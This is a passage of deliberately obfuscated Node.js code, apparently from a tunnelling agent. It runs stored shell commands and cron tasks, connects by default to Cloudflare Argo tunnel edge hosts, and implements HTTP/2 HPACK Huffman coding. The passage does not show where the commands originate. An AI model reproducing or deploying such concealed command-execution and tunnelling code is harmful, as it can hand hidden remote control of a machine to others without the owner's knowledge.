                'tqlvL': function (g, h) {
                    return g - h;
                }
            }, b = a0P[dn(0x264)][dn(0x3fe)](g => g[dn(0x8ea)] === 0x0)['length'], c = a0P[dn(0x264)]['length'] - b, d = a0P['crontasks_log'][dn(0x3fe)](g => g[dn(0x8ea)] === 0x0)[dn(0x8fc)], f = a['tqlvL'](a0P[dn(0x667)]['length'], d);
        return {
            'onetime': {
                'total_logged': a0P[dn(0x264)][dn(0x8fc)],
                'max_capacity': a0P[dn(0x73c)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0P['crontasks_log'][dn(0x8fc)],
                'max_capacity': a0P[dn(0x73c)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async ['executeOnetimeTasks']() {
        const dp = a0aY, a = {
                'cNWPs': function (c, d) {
                    return c < d;
                },
                'rxDGx': dp(0x4f0)
            }, b = [];
        for (let c = 0x0; a[dp(0x3c8)](c, a0P[dp(0x367)][dp(0x8fc)]); c++) {
            const d = a0P[dp(0x367)][c], f = await a0V[dp(0xec)](d), g = this[dp(0x6aa)](d, f[dp(0x230)], f[dp(0x8ea)], a[dp(0x91a)]);
            this['_appendLog'](a0P[dp(0x264)], g), b[dp(0x1f0)]({
                'cmd': d,
                'exitcode': f['exitcode'],
                'output': f['result'],
                'timeout': f[dp(0x1ee)]
            });
        }
        return a0P[dp(0x855)] = ![], {
            'status': 'ok',
            'executed': b['length'],
            'results': b
        };
    }
    static ['restoreFromStore']() {
        const dq = a0aY, a = {
                'rXAHQ': function (c, d) {
                    return c > d;
                }
            };
        a0Z[dq(0x5bd)]();
        const b = a0Z[dq(0x6a6)]();
        b['onetasks'][dq(0x8fc)] > 0x0 && (a0P[dq(0x367)] = b[dq(0x367)]);
        if (a[dq(0x3f1)](Object[dq(0x3d5)](b['crontasks'])[dq(0x8fc)], 0x0))
            try {
                a0a0[dq(0x461)](b['crontasks']);
            } catch (c) {
                a0D[dq(0x1e9)]('[TaskStore]\x20❌\x20定时任务恢复异常\x20(不影响服务):\x20' + c['message']);
            }
        a[dq(0x3f1)](a0P[dq(0x367)]['length'], 0x0) && a0P[dq(0x855)] && a0a0[dq(0x2c5)]()['catch'](d => a0D['error']('[TaskStore]\x20❌\x20启动任务恢复执行异常\x20(不影响服务):\x20' + d['message']));
    }
}
const a0a1 = a0aY(0x2e5), a0a2 = ((() => {
        const dr = a0aY, a = {
                'CMcHA': function (c, d) {
                    return c(d);
                },
                'OUiFz': function (c, d) {
                    return c > d;
                },
                'Asrzm': dr(0x378),
                'zdeFC': 'region2.v2.argotunnel.com'
            }, b = a['CMcHA'](String, process.env.KISAMA_EDGE_HOSTS || '')[dr(0x3ab)](',')[dr(0x162)](c => c[dr(0x2eb)]())[dr(0x3fe)](Boolean);
        return a[dr(0x297)](b[dr(0x8fc)], 0x0) ? b : [
            a['Asrzm'],
            a[dr(0x273)]
        ];
    })()), a0a3 = 0x1ea4, a0a4 = a0aY(0x144), a0a5 = a0aY(0x848), a0a6 = 0x4000, a0a7 = [
        [
            ':authority',
            ''
        ],
        [
            a0aY(0x642),
            a0aY(0x4fa)
        ],
        [
            a0aY(0x642),
            a0aY(0x3d4)
        ],
        [
            a0aY(0x4d1),
            '/'
        ],
        [
            ':path',
            a0aY(0x432)
        ],
        [
            ':scheme',
            'http'
        ],
        [
            a0aY(0x68a),
            a0aY(0x382)
        ],
        [
            ':status',
            a0aY(0x174)
        ],
        [
            a0aY(0x89e),
            a0aY(0x608)
        ],
        [
            a0aY(0x89e),
            a0aY(0x11a)
        ],
        [
            a0aY(0x89e),
            '304'
        ],
        [
            ':status',
            a0aY(0x133)
        ],
        [
            a0aY(0x89e),
            a0aY(0x38d)
        ],
        [
            ':status',
            '500'
        ],
        [
            a0aY(0x7ca),
            ''
        ],
        [
            a0aY(0x47c),
            a0aY(0x414)
        ],
        [
            a0aY(0x1a7),
            ''
        ],
        [
            a0aY(0x295),
            ''
        ],
        [
            a0aY(0x4f8),
            ''
        ],
        [
            'access-control-allow-origin',
            ''
        ],
        [
            a0aY(0x749),
            ''
        ],
        [
            a0aY(0x8f6),
            ''
        ],
        [
            a0aY(0x487),
            ''
        ],
        [
            a0aY(0x354),
            ''
        ],
        [
            a0aY(0x7d8),
            ''
        ],
        [
            a0aY(0x32b),
            ''
        ],
        [
            a0aY(0x64c),
            ''
        ],
        [
            a0aY(0x18b),
            ''
        ],
        [
            a0aY(0x501),
            ''
        ],
        [
            'content-range',
            ''
        ],
        [
            a0aY(0x7be),
            ''
        ],
        [
            a0aY(0x478),
            ''
        ],
        [
            a0aY(0x178),
            ''
        ],
        [
            'etag',
            ''
        ],
        [
            a0aY(0x573),
            ''
        ],
        [
            a0aY(0x67f),
            ''
        ],
        [
            a0aY(0x317),
            ''
        ],
        [
            a0aY(0x179),
            ''
        ],
        [
            a0aY(0x822),
            ''
        ],
        [
            'if-modified-since',
            ''
        ],
        [
            'if-none-match',
            ''
        ],
        [
            a0aY(0x218),
            ''
        ],
        [
            a0aY(0x691),
            ''
        ],
        [
            'last-modified',
            ''
        ],
        [
            a0aY(0x5e8),
            ''
        ],
        [
            a0aY(0x25e),
            ''
        ],
        [
            a0aY(0x36b),
            ''
        ],
        [
            'proxy-authenticate',
            ''
        ],
        [
            'proxy-authorization',
            ''
        ],
        [
            a0aY(0x326),
            ''
        ],
        [
            a0aY(0x5e0),
            ''
        ],
        [
            a0aY(0x290),
            ''
        ],
        [
            a0aY(0x246),
            ''
        ],
        [
            a0aY(0x395),
            ''
        ],
        [
            a0aY(0x43a),
            ''
        ],
        [
            a0aY(0x877),
            ''
        ],
        [
            a0aY(0x2f9),
            ''
        ],
        [
            a0aY(0x580),
            ''
        ],
        [
            a0aY(0x3e4),
            ''
        ],
        [
            a0aY(0x495),
            ''
        ],
        [
            a0aY(0x2c9),
            ''
        ]
    ], a0a8 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a9 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0aa() {
    const ds = a0aY, a = {
            'XqrZF': function (c, d) {
                return c < d;
            },
            'fpnCa': function (c, d) {
                return c - d;
            },
            'EWRjq': function (c, d) {
                return c & d;
            },
            'GaLIY': function (c, d) {
                return c >> d;
            },
            'DfcLo': function (c, d) {
                return c === d;
            },
            'gjvGV': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a['XqrZF'](c, a0a8[ds(0x8fc)]); c++) {
        const d = a0a8[c], f = a0a9[c];
        let g = b;
        for (let h = a[ds(0x411)](f, 0x1); h >= 0x0; h--) {
            const i = a[ds(0x8f3)](a[ds(0x896)](d, h), 0x1);
            a['DfcLo'](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a['gjvGV'](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0ab = a0aa();
function a0ac(a) {
    const dt = a0aY, b = {
            'qITzE': function (h, i) {
                return h >= i;
            },
            'GmfhX': function (h, i) {
                return h >> i;
            },
            'fmHnZ': function (h, i) {
                return h | i;
            },
            'rTCQc': dt(0x623),
            'DroaG': function (h, i) {
                return h >= i;
            },
            'uyQdy': dt(0x8b1),
            'MTGTE': function (h, i) {
                return h === i;
            },
            'JYFNH': 'HPACK\x20Huffman\x20EOS\x20inside\x20string',
            'JgMub': function (h, i) {
                return h > i;
            },
            'oalmX': function (h, i) {
                return h !== i;
            },
            'cNpdy': dt(0x5c4)
        }, c = [];
    let d = a0ab, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[dt(0x75d)](i, 0x0); i--) {
            const j = b[dt(0x1c3)](h, i) & 0x1;
            f = b[dt(0x8e3)](f << 0x1, j), g += 0x1, d = d[j];
            if (d === null)
                throw new Error(b[dt(0x7f5)]);
            if (b[dt(0x7b2)](d[0x2], 0x0)) {
                const k = b[dt(0x8b7)]['split']('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        f = 0x0;
                        continue;
                    case '1':
                        if (b[dt(0x7db)](d[0x2], 0x100))
                            throw new Error(b[dt(0x53a)]);
                        continue;
                    case '2':
                        d = a0ab;
                        continue;
                    case '3':
                        g = 0x0;
                        continue;
                    case '4':
                        c['push'](d[0x2]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (b[dt(0x2dd)](g, 0x7) || b[dt(0x281)](f, (0x1 << g) - 0x1))
        throw new Error(b['cNpdy']);
    return Buffer[dt(0x317)](c);
}
function a0ad(a, b, c) {
    const du = a0aY, d = {
            'qdbAj': function (j, k) {
                return j >= k;
            },
            'BGOHA': du(0x1d2),
            'KMZxk': function (j, k) {
                return j - k;
            },
            'XsWDU': function (j, k) {
                return j << k;
            },
            'vuDFD': function (j, k) {
                return j & k;
            },
            'pCyxz': function (j, k) {
                return j < k;
            },
            'mKyPV': function (j, k) {
                return j & k;
            },
            'HrWTu': function (j, k) {
                return j === k;
            },
            'RPVbN': function (j, k) {
                return j > k;
            }
        };
    if (d['qdbAj'](b, a['length']))
        throw new Error(d[du(0x426)]);
    const f = a[b];
    b += 0x1;
    const g = d['KMZxk'](d['XsWDU'](0x1, c), 0x1);
    let h = d[du(0x187)](f, g);
    if (d['pCyxz'](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (b >= a['length'])
            throw new Error(d[du(0x426)]);
        const j = a[b];
        b += 0x1, h += d[du(0x27f)](j, 0x7f) * Math[du(0x52e)](0x2, i);
        if (d[du(0x42d)](d[du(0x27f)](j, 0x80), 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (d[du(0x347)](i, 0x1c))
            throw new Error(du(0x718));
    }
}
function a0ae(a, b) {
    const dv = a0aY, c = {
            'RCWSP': function (j, k) {
                return j >= k;
            },
            'DgLeK': function (j, k) {
                return j(k);
            },
            'bPfBg': function (j, k, l, m) {
                return j(k, l, m);
            },
            'qpTcJ': function (j, k) {
                return j + k;
            },
            'NCman': function (j, k) {
                return j > k;
            },
            'PAKKU': dv(0x8d6),
            'ahWMP': function (j, k) {
                return j(k);
            }
        };
    if (c['RCWSP'](b, a[dv(0x8fc)]))
        throw new Error(dv(0x828));
    const d = c['DgLeK'](Boolean, a[b] & 0x80), [f, g] = c[dv(0x131)](a0ad, a, b, 0x7), h = c[dv(0x310)](g, f);
    if (c[dv(0x50d)](h, a[dv(0x8fc)]))
        throw new Error(c[dv(0x448)]);
    const i = a[dv(0x6e2)](g, h);
    return [
        d ? c[dv(0x1e8)](a0ac, i) : i,
        h
    ];
}
class a0af {
    constructor() {
        const dw = a0aY;
        this[dw(0x6e3)] = [], this['dynamicSize'] = 0x0, this[dw(0x156)] = 0x1000;
    }
    ['tableEntry'](a) {
        const dx = a0aY, b = {
                'EbgQO': function (d, f) {
                    return d <= f;
                },
                'xDUHf': dx(0x387),
                'VqBLf': function (d, f) {
                    return d - f;
                },
                'jYDrL': function (d, f) {
                    return d - f;
                },
                'WpxVE': dx(0x415)
            };
        if (b[dx(0x714)](a, 0x0))
            throw new Error(b['xDUHf']);
        if (a <= a0a7['length'])
            return a0a7[a - 0x1];
        const c = b[dx(0x7bf)](b['jYDrL'](a, a0a7[dx(0x8fc)]), 0x1);
        if (c < 0x0 || c >= this['dynamic'][dx(0x8fc)])
            throw new Error(b['WpxVE']);
        return this[dx(0x6e3)][c];
    }
    [a0aY(0x429)](a, b) {
        const dy = a0aY, c = {
                'sGBHX': function (f, g) {
                    return f + g;
                },
                'NxzYt': dy(0x330),
                'QSUPF': function (f, g) {
                    return f > g;
                },
                'vgcJQ': function (f, g) {
                    return f > g;
                },
                'HnRaP': function (f, g) {
                    return f + g;
                },
                'fnZaO': function (f, g) {
                    return f + g;
                }
            }, d = c['sGBHX'](c[dy(0x3f4)](0x20, Buffer[dy(0x80e)](a, c['NxzYt'])), Buffer['byteLength'](b, c[dy(0x43e)]));
        if (c['QSUPF'](d, this[dy(0x156)])) {
            this[dy(0x6e3)] = [], this[dy(0x901)] = 0x0;
            return;
        }
        while (c['QSUPF'](this[dy(0x6e3)][dy(0x8fc)], 0x0) && c['vgcJQ'](c[dy(0x6e9)](this[dy(0x901)], d), this[dy(0x156)])) {
            const [f, g] = this[dy(0x6e3)][dy(0x37e)]();
            this['dynamicSize'] -= c['fnZaO'](0x20, Buffer[dy(0x80e)](f, c['NxzYt'])) + Buffer[dy(0x80e)](g, c['NxzYt']);
        }
        this['dynamic'][dy(0x166)]([
            a,
            b
        ]), this['dynamicSize'] += d;
    }
    [a0aY(0x666)](a) {
        const dz = a0aY, b = {
                'yFneX': function (f, g) {
                    return f < g;
                },
                'IwCcS': function (f, g) {
                    return f & g;
                },
                'dKELZ': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'gAUHM': function (f, g) {
                    return f & g;
                },
                'tqibX': function (f, g, h) {
                    return f(g, h);
                },
                'otEpr': 'utf8',
                'TZbDn': function (f, g, h) {
                    return f(g, h);
                },
                'jzmRW': function (f, g) {
                    return f & g;
                },
                'yRCwM': function (f, g) {
                    return f > g;
                },
                'XuKZQ': function (f, g) {
                    return f > g;
                },
                'MJOLe': function (f, g) {
                    return f + g;
                },
                'hIzgP': function (f, g) {
                    return f + g;
                },
                'vAcNN': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'PwCCD': function (f, g, h) {
                    return f(g, h);
                },
                'cusJN': function (f, g, h) {
                    return f(g, h);
                }
            }, c = [];
        let d = 0x0;
        while (b[dz(0x7a1)](d, a[dz(0x8fc)])) {
            const f = a[d];
            if (b[dz(0x53e)](f, 0x80)) {
                let j;
                [j, d] = b[dz(0xdd)](a0ad, a, d, 0x7), c['push'](this[dz(0x787)](j));
                continue;
            }
            if (b[dz(0x441)](f, 0x40)) {
                let k, l;
                [k, d] = b[dz(0xdd)](a0ad, a, d, 0x6);
                if (k)
                    l = this['tableEntry'](k)[0x0];
                else {
                    let o;
                    [o, d] = b[dz(0x73d)](a0ae, a, d), l = o[dz(0x62f)](b[dz(0x795)])[dz(0x52c)]();
                }
                let m;
                [m, d] = b[dz(0x54f)](a0ae, a, d);
                const n = m['toString'](b['otEpr']);
                this['add'](l, n), c[dz(0x1f0)]([
                    l,
                    n
                ]);
                continue;
            }
            if (b[dz(0x26d)](f, 0x20)) {
                let p;
                [p, d] = b[dz(0xdd)](a0ad, a, d, 0x5);
                if (b[dz(0x2ec)](p, 0x1000))
                    throw new Error(dz(0x84f));
                this[dz(0x156)] = p;
                while (b[dz(0x2ec)](this[dz(0x6e3)][dz(0x8fc)], 0x0) && b[dz(0x500)](this[dz(0x901)], p)) {
                    const [q, r] = this[dz(0x6e3)][dz(0x37e)]();
                    this[dz(0x901)] -= b[dz(0x263)](b[dz(0x17a)](0x20, Buffer[dz(0x80e)](q, b[dz(0x795)])), Buffer['byteLength'](r, dz(0x330)));
                }
                continue;
            }
            let g, h;
            [g, d] = b[dz(0x8f4)](a0ad, a, d, 0x4);
            if (g)
                h = this[dz(0x787)](g)[0x0];
            else {
                let s;
                [s, d] = b[dz(0x459)](a0ae, a, d), h = s['toString'](dz(0x330))[dz(0x52c)]();
            }
            let i;
            [i, d] = b[dz(0x7f6)](a0ae, a, d), c[dz(0x1f0)]([
                h,
                i[dz(0x62f)](b['otEpr'])
            ]);
        }
        return c;
    }
}
function a0ag(a, b, c) {
    const dA = a0aY, d = {
            'BZCZN': function (h, i) {
                return h - i;
            },
            'Lzbkn': function (h, i) {
                return h << i;
            },
            'lXcwr': function (h, i) {
                return h < i;
            },
            'dCLVG': function (h, i) {
                return h | i;
            },
            'Shhnn': function (h, i) {
                return h | i;
            },
            'UJiQz': function (h, i) {
                return h >= i;
            },
            'cjBAa': function (h, i) {
                return h | i;
            },
            'ywLOY': function (h, i) {
                return h / i;
            }
        }, f = d[dA(0x6e7)](d[dA(0x430)](0x1, b), 0x1);
    if (d['lXcwr'](a, f))
        return Buffer[dA(0x317)]([d[dA(0x56a)](c, a)]);
    const g = [d[dA(0x7e3)](c, f)];
    a -= f;
    while (d[dA(0x4a1)](a, 0x80)) {
        g[dA(0x1f0)](d[dA(0x4fb)](a & 0x7f, 0x80)), a = Math[dA(0x7c7)](d['ywLOY'](a, 0x80));
    }
    return g[dA(0x1f0)](a), Buffer[dA(0x317)](g);
}
function a0ah(a) {
    const dB = a0aY, b = {
            'huCFM': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer[dB(0x317)](a, 'utf8');
    return Buffer[dB(0x65f)]([
        b['huCFM'](a0ag, c[dB(0x8fc)], 0x7, 0x0),
        c
    ]);
}
function a0ai(a) {
    const dC = a0aY, b = {
            'KemAx': function (d, f) {
                return d === f;
            },
            'GGQMs': dC(0x89e),
            'CrlZu': dC(0x174),
            'STBPp': '204',
            'BKDYE': function (d, f) {
                return d === f;
            },
            'sfrXw': dC(0x11a),
            'qtqDh': function (d, f) {
                return d === f;
            },
            'EpIFT': dC(0x847),
            'OpJjw': function (d, f) {
                return d === f;
            },
            'odVPI': dC(0x133),
            'zHpRF': function (d, f) {
                return d === f;
            },
            'srMus': dC(0x38d),
            'sEibz': dC(0x8eb),
            'SSabF': function (d, f, g, h) {
                return d(f, g, h);
            },
            'gfIfm': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b[dC(0x5a4)](d, b[dC(0x4c9)]) && b[dC(0x5a4)](f, b[dC(0x4f6)]))
            c[dC(0x1f0)](0x88);
        else {
            if (d === b['GGQMs'] && b[dC(0x5a4)](f, b[dC(0x1d9)]))
                c[dC(0x1f0)](0x89);
            else {
                if (d === dC(0x89e) && b[dC(0x81a)](f, b[dC(0x304)]))
                    c[dC(0x1f0)](0x8a);
                else {
                    if (b['KemAx'](d, ':status') && b[dC(0x6a9)](f, b[dC(0x8a7)]))
                        c[dC(0x1f0)](0x8b);
                    else {
                        if (d === dC(0x89e) && b[dC(0x442)](f, b['odVPI']))
                            c[dC(0x1f0)](0x8c);
                        else {
                            if (d === dC(0x89e) && b[dC(0x22a)](f, b[dC(0x1d7)]))
                                c[dC(0x1f0)](0x8d);
                            else
                                b[dC(0x6a9)](d, b[dC(0x4c9)]) && b['BKDYE'](f, b[dC(0x728)]) ? c[dC(0x1f0)](0x8e) : (c[dC(0x1f0)](...b[dC(0x460)](a0ag, 0x0, 0x4, 0x0)), c['push'](...b[dC(0x5db)](a0ah, d)), c['push'](...a0ah(f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[dC(0x317)](c);
}
function a0b(a, b) {
    a = a - 0xc8;
    const c = a0a();
    let d = c[a];
    if (a0b['jGiuLV'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['cWAIzq'] = e, a0b['iXnxeb'] = {}, a0b['jGiuLV'] = !![];
    }
    const f = c[0x0];
    a0b['grcOuO'] !== f && (a0b['iXnxeb'] = {}, a0b['grcOuO'] = f);
    const g = a0b['iXnxeb'][a];
    return g === undefined ? (d = a0b['cWAIzq'](d), a0b['iXnxeb'][a] = d) : d = g, d;
}
class a0aj {
    constructor() {
        const dD = a0aY;
        this[dD(0x29d)] = [];
    }
    [a0aY(0x5fd)](a) {
        const dE = a0aY, b = {
                'HAJaE': function (d, f) {
                    return d < f;
                }
            }, c = this[dE(0x29d)]['length'];
        for (let d = 0x0; b[dE(0x7d6)](d, a); d++) {
            this['words'][dE(0x1f0)](0x0n);
        }
        return c;
    }
    [a0aY(0x86c)](a, b, c, d) {
        const dF = a0aY, f = {
                'tewgx': function (j, k) {
                    return j - k;
                },
                'APxMY': function (j, k) {
                    return j - k;
                },
                'OdsQQ': function (j, k) {
                    return j & k;
                },
                'rfboy': function (j, k) {
                    return j << k;
                },
                'jXkoF': function (j, k) {
                    return j | k;
                },
                'FKfZT': function (j, k) {
                    return j(k);
                },
                'fZakI': function (j, k) {
                    return j << k;
                },
                'LCpVh': function (j, k) {
                    return j & k;
                }
            }, g = f[dF(0x64d)](f['APxMY'](b, a), 0x1), h = f[dF(0x6c1)](f['rfboy'](BigInt(g), 0x2n), 0xfffffffcn), i = f[dF(0x12b)](f[dF(0x424)](BigInt, c & 0xffff), f[dF(0x112)](BigInt(f['LCpVh'](d, 0xffff)), 0x10n));
        this[dF(0x29d)][a] = f[dF(0x12b)](h, i << 0x20n);
    }
    ['setU8'](a, b, c) {
        const dG = a0aY, d = {
                'ScNgD': function (g, h) {
                    return g | h;
                },
                'SJNyz': function (g, h) {
                    return g & h;
                },
                'AcUKh': function (g, h) {
                    return g << h;
                },
                'KeRiX': function (g, h) {
                    return g(h);
                },
                'RGuPc': function (g, h) {
                    return g(h);
                },
                'MhngR': function (g, h) {
                    return g * h;
                }
            }, f = 0xffn << BigInt(b * 0x8);
        this[dG(0x29d)][a] = d[dG(0x59d)](d[dG(0x6fc)](this['words'][a], ~f), d[dG(0x29f)](d[dG(0x48a)](BigInt, d[dG(0x6fc)](c, 0xff)), d[dG(0x425)](BigInt, d[dG(0x2b2)](b, 0x8))));
    }
    [a0aY(0x10c)](a, b, c) {
        const dH = a0aY, d = {
                'awyFF': function (g, h) {
                    return g(h);
                },
                'vGunq': function (g, h) {
                    return g * h;
                },
                'nzzgG': function (g, h) {
                    return g | h;
                },
                'ycnCD': function (g, h) {
                    return g & h;
                },
                'HHWME': function (g, h) {
                    return g << h;
                },
                'NhGfC': function (g, h) {
                    return g & h;
                },
                'fAtpt': function (g, h) {
                    return g * h;
                }
            }, f = 0xffffn << d['awyFF'](BigInt, d['vGunq'](b, 0x8));
